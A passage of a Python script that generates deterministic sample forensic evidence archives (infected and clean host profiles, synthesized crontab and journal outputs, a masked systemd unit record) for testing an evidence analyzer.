    "crontab_root": (["crontab", "-l", "-u", "root"], "persistence"),
    "crontab_alice": (["crontab", "-l", "-u", "alice"], "persistence"),
    "journalctl_export": (["journalctl", "--no-pager", "-o", "short-iso"], "journal"),
}


def ensure_masked_unit_record(manifest):
    for rec in manifest.get("files", []):
        if rec.get("original_path") == MASKED_UNIT_PATH and rec.get("masked"):
            return "collector"
    seq = 0
    for rec in manifest.get("files", []) + manifest.get("triage", []):
        seq = max(seq, rec.get("collected_seq", 0))
    manifest["files"].append(
        {
            "original_path": MASKED_UNIT_PATH,
            "archive_path": None,
            "category": "persistence",
            "status": "ok",
            "type": "symlink",
            "sha256": None,
            "reason": None,
            "error_type": None,
            "hashable": False,
            "collected_seq": seq + 1,
            "collected_at": FIXED_COLLECTION_UTC,
            "size": len("/dev/null"),
            "mode": "0o777",
            "mode_raw": 0o120777,
            "uid": 0,
            "gid": 0,
            "uname": "root",
            "gname": "root",
            "mtime": FIXED_COLLECTION_UTC,
            "ctime": FIXED_COLLECTION_UTC,
            "atime": FIXED_COLLECTION_UTC,
            "mtime_epoch": float(FIXED_EPOCH),
            "ctime_epoch": float(FIXED_EPOCH),
            "atime_epoch": float(FIXED_EPOCH),
            "suid": False,
            "sgid": False,
            "symlink_target": "/dev/null",
            "masked": True,
        }
    )
    manifest["counts"]["files_total"] = len(manifest["files"])
    manifest["counts"]["files_ok"] = sum(1 for rec in manifest["files"] if rec["status"] == "ok")
    return "synthesized"


def patch_and_repack(mod, host_dir, profile, seed, live_payloads):
    host_dir = Path(host_dir)
    tar_path = host_dir / "evidence.tar.gz"
    work = host_dir / ".repack"
    if work.exists():
        shutil.rmtree(work)
    work.mkdir(parents=True)
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(work)
    manifest_path = work / "manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))

    manifest["timezone"] = dict(MANIFEST_TZ)
    manifest["collection_time_utc"] = FIXED_COLLECTION_UTC
    manifest["collection_start_epoch"] = float(FIXED_EPOCH)
    manifest["collection_end_epoch"] = float(FIXED_EPOCH + 2)
    manifest["duration_seconds"] = 2.0
    manifest["generator"] = {
        "tool": "sample_evidence/generate.py",
        "seed": seed,
        "host_profile": profile,
        "note": "live/* outputs are synthesized fixtures; evidence/* and triage/* produced by the real collector",
    }
    for phase in manifest.get("phases", []):
        phase["started_utc"] = FIXED_COLLECTION_UTC
    for rec in manifest.get("files", []):
        rec["collected_at"] = FIXED_COLLECTION_UTC
    for rec in manifest.get("triage", []):
        rec["collected_at"] = FIXED_COLLECTION_UTC
    if profile == "infected":
        manifest["generator"]["masked_unit"] = ensure_masked_unit_record(manifest)

    seq = 0
    for rec in manifest.get("files", []) + manifest.get("triage", []):
        if rec.get("collected_seq", 0) > seq:
            seq = rec["collected_seq"]
    live_records = []
    for name in sorted(live_payloads):
        payload = live_payloads[name].encode("utf-8")
        (work / "live").mkdir(exist_ok=True)
        (work / "live" / (name + ".txt")).write_bytes(payload)
        argv, category = LIVE_ARGV[name]
        seq += 1
        live_records.append(
            {
                "name": name,
                "argv": list(argv),
                "category": category,
                "status": "ok",
                "exit_code": 0,
                "seconds": 0.1,
                "reason": None,
                "archive_path": f"live/{name}.txt",
                "sha256": hashlib.sha256(payload).hexdigest(),
                "size": len(payload),
                "has_stderr": False,
                "collected_seq": seq,
                "collected_at": FIXED_COLLECTION_UTC,
            }
        )
    kept = [rec for rec in manifest.get("live_commands", []) if rec.get("archive_path")]
    manifest["live_commands"] = kept + live_records
    manifest["counts"]["live_total"] = len(manifest["live_commands"])
    manifest["counts"]["live_ok"] = sum(1 for rec in manifest["live_commands"] if rec["status"] == "ok")
    manifest["counts"]["live_not_present"] = sum(
        1 for rec in manifest["live_commands"] if rec["status"] == "not_present"
    )
    manifest["counts"]["hashed_entries"] = (
        sum(1 for rec in manifest["live_commands"] if rec.get("sha256"))
        + sum(1 for rec in manifest.get("triage", []) if rec.get("sha256"))
        + sum(1 for rec in manifest.get("files", []) if rec.get("sha256"))
    )
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")

    ordered = ["manifest.json", "collect.log"]
    for rec in manifest.get("files", []) + manifest["live_commands"] + manifest.get("triage", []):
        if rec.get("archive_path"):
            ordered.append(rec["archive_path"])
    tmp_tar = host_dir / "evidence.tar.gz.partial"
    with open(tmp_tar, "wb") as raw:
        with gzip.GzipFile(filename="", mode="wb", compresslevel=6, fileobj=raw, mtime=FIXED_EPOCH) as gz:
            with tarfile.open(fileobj=gz, mode="w") as tar:
                for arc in ordered:
                    real = work / Path(*arc.split("/"))
                    if not real.is_file():
                        continue
                    info = tar.gettarinfo(str(real), arcname=arc)
                    info.mtime = FIXED_EPOCH
                    info.uid = 0
                    info.gid = 0
                    info.uname = "root"
                    info.gname = "root"
                    with open(real, "rb") as handle:
                        tar.addfile(info, handle)
    os.replace(tmp_tar, tar_path)
    digest = hashlib.sha256(tar_path.read_bytes()).hexdigest()
    (host_dir / "evidence.tar.gz.sha256").write_text(f"{digest}  evidence.tar.gz\n", encoding="ascii")
    shutil.rmtree(work, ignore_errors=True)
    return {"archive": tar_path, "sha256": digest, "manifest": manifest}


def generate_host(mod, out_dir, profile, seed):
    out_dir = Path(out_dir)
    host_dir = out_dir / profile
    rootfs = host_dir / "rootfs"
    if host_dir.exists():
        shutil.rmtree(host_dir)
    rootfs.mkdir(parents=True)
    rng = random.Random(f"{profile}:{seed}")
    if profile == "infected":
        build_infected(rootfs, rng)
    elif profile == "clean":
        build_clean(rootfs, rng)
    else:
        raise ValueError(f"unknown profile: {profile}")
    code = mod.main(["-o", str(host_dir), "--root", str(rootfs), "--skip-live"])
    if code != 0:
        raise RuntimeError(f"collector failed for profile {profile}")
    live_payloads = live_files(mod, profile, rng)
    result = patch_and_repack(mod, host_dir, profile, seed, live_payloads)
    result["rootfs"] = rootfs
    result["profile"] = profile
    return result


def generate_all(out_dir, seed=DEFAULT_SEED):
    mod = load_collector()
    results = {}
    for profile in ("infected", "clean"):
        results[profile] = generate_host(mod, out_dir, profile, seed)
    return results


def build_parser():
    parser = argparse.ArgumentParser(description="Generate deterministic sample evidence for analyzer testing.")
    parser.add_argument("--out", default=str(REPO_ROOT / "sample_evidence" / "out"), help="output directory")
    parser.add_argument("--seed", type=int, default=DEFAULT_SEED, help="deterministic seed")
    parser.add_argument(
        "--hosts", default="infected,clean", help="comma-separated profiles to generate (infected,clean)"
    )
    return parser


def main(argv=None):
    parser = build_parser()
    opts = parser.parse_args(argv)
    mod = load_collector()
    for profile in [item.strip() for item in opts.hosts.split(",") if item.strip()]:
        result = generate_host(mod, opts.out, profile, opts.seed)
        print("profile {:<8} archive: {}".format(profile, result["archive"]))
        print("profile {:<8} sha256 : {}".format(profile, result["sha256"]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
